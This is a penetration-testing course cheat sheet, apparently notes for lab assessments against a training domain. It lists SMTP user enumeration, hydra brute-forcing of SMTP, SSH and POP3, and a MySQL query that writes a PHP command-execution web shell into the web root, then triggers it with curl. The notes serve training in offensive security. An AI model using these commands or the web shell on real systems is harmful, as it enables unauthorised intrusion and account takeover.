https://github.com/missteek/cpts-quick-references/blob/main/assessments/Password%20Attacks%20Lab%20-%20Hard.md


#### Attacking Common Services - Easy:
```
UserEnum:       smtp-user-enum -M RCPT -U users.txt -D inlanefreight.htb -t $ip
PW Bruteforce:  hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt $ip smtp
Login MySQL:    mysql -h $ip -u <user> -p <password>
SQL RCE:        SELECT "<?php if(isset($_GET['cmd'])){ echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>'; } ?>" INTO OUTFILE 'C:/xampp/htdocs/cmd.php';
RCE:            curl http://$ip/cmd.php?cmd=whoami
```
#### Attacking Common Services - Medium:
```
nmap scan:      nmap $ip -p- --open -o nmap.txt | grep '/tcp' | cut -d'/' -f1 | paste -sd, -
ftp anonymous:  ftp $ip 30021
download file:  get mynotes.txt
PW Bruteforce:  hydra -l simon -P mynotes.txt $ip ssh OR hydra -l simon -P mynotes.txt $ip pop3
Login:          ssh simon@$ip
```

#### Attacking Common Services - Hard:
